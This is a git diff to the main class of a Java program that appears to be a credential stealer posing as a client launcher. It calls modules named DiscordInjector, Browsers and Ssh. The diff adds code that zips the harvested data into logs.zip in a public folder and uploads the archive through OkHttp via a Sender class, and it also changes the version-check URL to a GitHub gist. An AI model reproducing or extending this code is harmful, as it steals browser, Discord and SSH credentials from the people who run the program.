@@ -1,7 +1,13 @@
 package io.github.luxotick;
 
 import io.github.luxotick.impl.*;
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.OkHttpClient;
+import okhttp3.RequestBody;
 
+import java.io.File;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.net.MalformedURLException;
 import java.util.Objects;
@@ -14,6 +20,7 @@ import java.io.FileOutputStream;
 
 
 public class Start {
+
 	public static void main(String[] argument) throws Exception {
         String version = "1.0.2";
 		versionChecker(version);
@@ -21,7 +28,7 @@ public class Start {
 		if (DiscordInjector.instance == null){
 			DiscordInjector.instance = new DiscordInjector();
 		}
-	    DiscordInjector.instance.initialize();
+	    //DiscordInjector.instance.initialize();
         Sender.sendMessage("DiscordInjector initialized.");
 		Sender.sendMessage("Starting other arguments...");
 		Browsers.main(argument);
@@ -31,12 +38,26 @@ public class Start {
 		Ssh.main(argument);
 		Sender.sendMessage("Ssh done.");
 		Sender.sendMessage("Now launching the client.");
-		System.exit(0);
+        Zip.main(argument);
+        OkHttpClient client = new OkHttpClient();
+
+        final String zort = "C:\\Users\\Public\\Documents\\logs.zip";
+
+        File asd = new File(zort);
+
+        RequestBody requestBody = new MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("file", asd.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), asd))
+                .build();
+
+        Sender.Sender(client, asd, requestBody);
+
+        System.exit(0);
 	}
 
     public static void versionChecker(String version) throws IOException {
 		// read raw data from url
-		Scanner scanner = new Scanner(new URL("https://dont-try.me/version").openStream());
+		Scanner scanner = new Scanner(new URL("https://gist.githubusercontent.com/Luxotick/2290b71380bb4a68081632f56e3c9efa/raw/2238f8815902234acad57f3d70e2198db86f1524/gistfile1.txt").openStream());
 		// read first line
 		String line = scanner.nextLine();
 
